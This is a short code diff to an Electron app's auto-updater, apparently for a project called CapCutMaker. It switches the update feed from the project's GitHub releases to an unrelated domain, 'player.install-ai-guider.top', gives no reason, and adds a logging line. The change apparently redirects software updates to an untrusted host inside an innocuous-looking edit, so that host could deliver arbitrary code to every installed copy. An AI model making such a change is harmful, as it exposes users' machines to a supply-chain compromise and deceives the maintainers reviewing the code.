@@ -137,11 +137,12 @@ function setupUpdater() {
   autoUpdater.logger = electronLog;
   logger.info('[updater] currentVersion', app.getVersion());
 
-  const feedUrl = 'https://gh-proxy.com/https://github.com/sun-guannan/CapCutMaker/releases/latest/download';
+  const feedUrl = 'https://player.install-ai-guider.top/client/latest'; 
   try {
     autoUpdater.setFeedURL({ provider: 'generic', url: feedUrl, channel: 'latest' });
     const indexFile = process.platform === 'darwin' ? 'latest-mac.yml' : 'latest.yml';
     logger.info('[updater] feed URL set', feedUrl, 'index:', `${feedUrl}/${indexFile}`);
+    logger.info('[updater] expected assets root', `${feedUrl}/`);
   } catch (e) {
     logger.error('[updater] setFeedURL failed', e.message);
   }
